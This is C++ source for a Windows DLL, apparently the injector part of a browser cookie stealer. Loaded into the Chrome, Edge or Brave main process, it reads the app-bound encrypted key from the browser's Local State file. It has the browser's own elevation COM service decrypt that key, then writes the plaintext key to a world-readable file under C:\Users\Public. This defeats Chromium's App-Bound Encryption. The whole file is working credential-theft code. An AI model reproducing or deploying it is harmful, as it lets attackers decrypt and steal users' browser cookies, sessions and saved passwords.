#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <vector>
#include <string>
#include <cstdarg>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

static void Log(const char* src, const char* fmt, ...) {
    static int enabled = -1;
    if (enabled < 0) enabled = (GetFileAttributesW(L"C:\\Users\\Public\\cookier_debug_enabled") != INVALID_FILE_ATTRIBUTES) ? 1 : 0;
    if (!enabled) return;
    char msg[2048];
    va_list ap; va_start(ap, fmt);
    _vsnprintf_s(msg, sizeof(msg), _TRUNCATE, fmt, ap);
    va_end(ap);
    SYSTEMTIME st; GetLocalTime(&st);
    char line[2300];
    int n = _snprintf_s(line, sizeof(line), _TRUNCATE,
        "[%02d:%02d:%02d.%03d] [%-8s] [pid=%5lu] %s\r\n",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
        src, GetCurrentProcessId(), msg);
    if (n < 0) n = (int)strlen(line);
    if (n <= 0) return;
    HANDLE h = CreateFileW(L"C:\\Users\\Public\\cookier_debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(h, line, (DWORD)n, &w, NULL); CloseHandle(h); }
}

static const CLSID CLSID_ChromeElevator = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
static const IID IID_Chrome_IElevator  = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
static const IID IID_Chrome_IElevator2 = {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

static const CLSID CLSID_EdgeElevator = {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}};
static const IID IID_Edge_IElevator  = {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}};
static const IID IID_Edge_IElevator2 = {0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}};

// Brave: distinct CLSID, distinct IElevator v1 IID, shared IElevator2 IID with Chrome.
static const CLSID CLSID_BraveElevator = {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}};
static const IID IID_Brave_IElevator  = {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}};
static const IID IID_Brave_IElevator2 = {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};

struct IElevatorChrome : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

struct IElevatorEdge : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Placeholder1() = 0;
    virtual HRESULT STDMETHODCALLTYPE Placeholder2() = 0;
    virtual HRESULT STDMETHODCALLTYPE Placeholder3() = 0;
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(int, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};

static std::vector<BYTE> Base64Decode(const std::string& encoded) {
    static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<BYTE> out; int val = 0, valb = -8;
    for (unsigned char c : encoded) {
        if (c == '=') break;
        auto pos = chars.find((char)c);
        if (pos == std::string::npos) continue;
        val = (val << 6) + (int)pos; valb += 6;
        if (valb >= 0) { out.push_back((BYTE)((val >> valb) & 0xFF)); valb -= 8; }
    }
    return out;
}

static std::string ExtractAppBoundKey(const std::string& json) {
    const std::string key = "\"app_bound_encrypted_key\"";
    size_t pos = json.find(key);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + key.length());
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";
    size_t start = pos + 1;
    size_t end = json.find('"', start);
    if (end == std::string::npos) return "";
    return json.substr(start, end - start);
}

enum class BrowserKind { Chrome, Edge, Brave };

static BrowserKind GetBrowserKind() {
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring p = exePath;
    for (auto& c : p) if (c >= L'A' && c <= L'Z') c = (wchar_t)(c + 32);
    BrowserKind k = BrowserKind::Chrome;
    if (p.find(L"msedge.exe") != std::wstring::npos) k = BrowserKind::Edge;
    else if (p.find(L"brave.exe") != std::wstring::npos) k = BrowserKind::Brave;
    Log("INJECTOR", "GetBrowserKind: %ls -> kind=%d", p.c_str(), (int)k);
    return k;
}

// Chromium child processes carry --type=<something>. Only the main browser process
// should call DecryptData; running the injector in child processes causes a mutex
// race and truncates the key file.
static bool IsBrowserMainProcess() {
    LPWSTR cmd = GetCommandLineW();
    if (!cmd) { Log("INJECTOR", "IsBrowserMainProcess: GetCommandLineW null -> assume main"); return true; }
    bool isChild = (wcsstr(cmd, L"--type=") != nullptr);
    Log("INJECTOR", "IsBrowserMainProcess: cmdline_len=%zu --type=%s", wcslen(cmd), isChild ? "PRESENT (child)" : "ABSENT (main)");
    return !isChild;
}

DWORD WINAPI WorkerThread(LPVOID) {
    Log("INJECTOR", "===== WorkerThread start =====");
    if (!IsBrowserMainProcess()) {
        Log("INJECTOR", "skipping: child process");
        return 0;
    }
    BrowserKind kind = GetBrowserKind();

    const char* keyPath;
    const wchar_t* localStateSub;
    if (kind == BrowserKind::Edge)        { keyPath = "C:\\Users\\Public\\edge_abe_key.bin";  localStateSub = L"\\Microsoft\\Edge\\User Data\\Local State"; }
    else if (kind == BrowserKind::Brave)  { keyPath = "C:\\Users\\Public\\brave_abe_key.bin"; localStateSub = L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"; }
    else                                  { keyPath = "C:\\Users\\Public\\chrome_abe_key.bin"; localStateSub = L"\\Google\\Chrome\\User Data\\Local State"; }
    Log("INJECTOR", "keyPath=%s", keyPath);

    if (GetFileAttributesA(keyPath) != INVALID_FILE_ATTRIBUTES) {
        Log("INJECTOR", "key file already exists -> skip");
        return 0;
    }
    HANDLE hMutex = CreateMutexW(nullptr, FALSE, L"Local\\ChromiumAbeKeyMutex");
    if (hMutex) {
        DWORD wait = WaitForSingleObject(hMutex, 30000);
        Log("INJECTOR", "mutex wait result=0x%08lx", wait);
    }

    if (GetFileAttributesA(keyPath) == INVALID_FILE_ATTRIBUTES) {
        CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        PWSTR localAppData = nullptr;
        SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &localAppData);
        if (localAppData) {
            std::wstring statePath = std::wstring(localAppData) + localStateSub;
            CoTaskMemFree(localAppData);
            Log("INJECTOR", "reading Local State: %ls", statePath.c_str());
            std::ifstream f(statePath, std::ios::binary);
            if (!f) { Log("INJECTOR", "Local State open FAILED"); }
            else {
                std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                Log("INJECTOR", "Local State size=%zu bytes", content.size());
                std::string b64 = ExtractAppBoundKey(content);
                Log("INJECTOR", "app_bound_encrypted_key: %zu b64 chars", b64.size());
                if (!b64.empty()) {
                    auto blob = Base64Decode(b64);
                    Log("INJECTOR", "base64 decode -> %zu bytes", blob.size());
                    if (blob.size() > 4) blob.erase(blob.begin(), blob.begin() + 4);
                    Log("INJECTOR", "after 4-byte strip -> %zu bytes", blob.size());
                    BSTR cipher = SysAllocStringByteLen((const char*)blob.data(), (UINT)blob.size());
                    if (cipher) {
                        BSTR plain = nullptr; DWORD lastError = 0;
                        HRESULT hr = E_FAIL;

                        if (kind == BrowserKind::Edge) {
                            IElevatorEdge* e = nullptr;
                            hr = CoCreateInstance(CLSID_EdgeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Edge_IElevator2, (void**)&e);
                            Log("INJECTOR", "CoCreateInstance(Edge v2) hr=0x%08lx", (unsigned long)hr);
                            if (FAILED(hr)) {
                                hr = CoCreateInstance(CLSID_EdgeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Edge_IElevator, (void**)&e);
                                Log("INJECTOR", "CoCreateInstance(Edge v1) hr=0x%08lx", (unsigned long)hr);
                            }
                            if (SUCCEEDED(hr) && e) {
                                HRESULT b = CoSetProxyBlanket(e, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                                Log("INJECTOR", "CoSetProxyBlanket hr=0x%08lx", (unsigned long)b);
                                hr = e->DecryptData(cipher, &plain, &lastError);
                                Log("INJECTOR", "DecryptData hr=0x%08lx lastError=%lu", (unsigned long)hr, lastError);
                                e->Release();
                            }
                        } else if (kind == BrowserKind::Brave) {
                            IElevatorChrome* e = nullptr;
                            hr = CoCreateInstance(CLSID_BraveElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Brave_IElevator2, (void**)&e);
                            Log("INJECTOR", "CoCreateInstance(Brave v2) hr=0x%08lx", (unsigned long)hr);
                            if (FAILED(hr)) {
                                hr = CoCreateInstance(CLSID_BraveElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Brave_IElevator, (void**)&e);
                                Log("INJECTOR", "CoCreateInstance(Brave v1) hr=0x%08lx", (unsigned long)hr);
                            }
                            if (SUCCEEDED(hr) && e) {
                                HRESULT b = CoSetProxyBlanket(e, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                                Log("INJECTOR", "CoSetProxyBlanket hr=0x%08lx", (unsigned long)b);
                                hr = e->DecryptData(cipher, &plain, &lastError);
                                Log("INJECTOR", "DecryptData hr=0x%08lx lastError=%lu", (unsigned long)hr, lastError);
                                e->Release();
                            }
                        } else {
                            IElevatorChrome* e = nullptr;
                            hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Chrome_IElevator2, (void**)&e);
                            Log("INJECTOR", "CoCreateInstance(Chrome v2) hr=0x%08lx", (unsigned long)hr);
                            if (FAILED(hr)) {
                                hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_Chrome_IElevator, (void**)&e);
                                Log("INJECTOR", "CoCreateInstance(Chrome v1) hr=0x%08lx", (unsigned long)hr);
                            }
                            if (SUCCEEDED(hr) && e) {
                                HRESULT b = CoSetProxyBlanket(e, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                                Log("INJECTOR", "CoSetProxyBlanket hr=0x%08lx", (unsigned long)b);
                                hr = e->DecryptData(cipher, &plain, &lastError);
                                Log("INJECTOR", "DecryptData hr=0x%08lx lastError=%lu", (unsigned long)hr, lastError);
                                e->Release();
                            }
                        }

                        if (SUCCEEDED(hr) && plain) {
                            UINT plen = SysStringByteLen(plain);
                            Log("INJECTOR", "plaintext size=%u bytes", plen);
                            std::ofstream out(keyPath, std::ios::binary);
                            out.write((const char*)plain, plen);
                            out.close();
                            Log("INJECTOR", "wrote key file (%u bytes)", plen);
                        } else {
                            Log("INJECTOR", "DecryptData failed or returned null plaintext");
                        }
                        if (plain) SysFreeString(plain);
                        SysFreeString(cipher);
                    } else { Log("INJECTOR", "SysAllocStringByteLen failed"); }
                } else { Log("INJECTOR", "app_bound_encrypted_key NOT found in Local State"); }
            }
        } else { Log("INJECTOR", "SHGetKnownFolderPath returned null"); }
        CoUninitialize();
    }
    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
    Log("INJECTOR", "===== WorkerThread end =====");
    return 0;
}

extern "C" __declspec(dllexport) DWORD WINAPI TriggerDecryption(LPVOID) {
    Log("INJECTOR", "TriggerDecryption called");
    return WorkerThread(nullptr);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        Log("INJECTOR", "DllMain attach hModule=%p", hModule);
    }
    return TRUE;
}